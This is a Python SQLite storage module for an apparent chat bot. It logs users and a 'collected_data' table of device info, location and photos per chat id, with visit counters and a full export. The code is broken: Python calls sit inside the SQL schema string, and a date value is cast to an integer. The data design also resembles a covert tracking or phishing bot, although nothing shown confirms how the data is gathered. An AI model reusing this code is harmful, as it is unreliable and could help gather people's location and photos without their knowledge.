
import sqlite3
import json
import datetime
import os

DB_PATH = "bot_data.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            first_seen TEXT,
            last_seen TEXT,
            photo_path TEXT
        );
        conn.commit()
        conn.close()
        CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            timestamp TEXT,
            device_info TEXT,
            location TEXT,
            photos TEXT,
            additional TEXT
        );
        
        CREATE TABLE IF NOT EXISTS bot_stats (
            key TEXT PRIMARY KEY,
            value TEXT
        );
    ''')
    
    # Default stats
    defaults = {
        "total_users": "0", "users_today": "0",
        "total_data": "0", "total_visits": "0",
        "bot_status": "1", "last_date": ""
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO bot_stats (key, value) VALUES (?, ?)", (k, v))
    
    conn.commit()
    conn.close()

def get_stat(key):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT value FROM bot_stats WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return int(row["value"]) if row else 0

def update_stat(key, value):
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE bot_stats SET value=? WHERE key=?", (str(value), key))
    conn.commit()
    conn.close()

def is_bot_on():
    return get_stat("bot_status") == 1

def add_user(chat_id, username, first_name):
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
    existing = c.fetchone()
    
    if existing:
        c.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE chat_id=?",
                  (username, first_name, now, chat_id))
    else:
        c.execute("INSERT INTO users (chat_id, username, first_name, first_seen, last_seen) VALUES (?,?,?,?,?)",
                  (chat_id, username, first_name, now, now))
        update_stat("total_users", get_stat("total_users") + 1)
    
    # Daily stats
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    last_date = get_stat("last_date")
    if last_date != today:
        update_stat("last_date", today)
        update_stat("users_today", 0)
    update_stat("users_today", get_stat("users_today") + 1)
    
    conn.commit()
    conn.close()

def save_collected_data(chat_id, device_info, location, photos, additional):
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute('''INSERT INTO collected_data 
                (chat_id, timestamp, device_info, location, photos, additional)
                VALUES (?, ?, ?, ?, ?, ?)''',
              (chat_id, now,
               json.dumps(device_info), json.dumps(location),
               json.dumps(photos), json.dumps(additional)))
    conn.commit()
    conn.close()
    
    update_stat("total_data", get_stat("total_data") + 1)
    update_stat("total_visits", get_stat("total_visits") + 1)

def get_all_users():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    return [dict(r) for r in rows]

def get_recent_data(limit=10):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM collected_data ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return [dict(r) for r in rows]

def export_all_data():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM collected_data ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    result = []
    for r in rows:
        d = dict(r)
        d["device_info"] = json.loads(d["device_info"]) if d["device_info"] else {}
        d["location"] = json.loads(d["location"]) if d["location"] else {}
        d["photos"] = json.loads(d["photos"]) if d["photos"] else []
        d["additional"] = json.loads(d["additional"]) if d["additional"] else {}
        result.append(d)
    return result
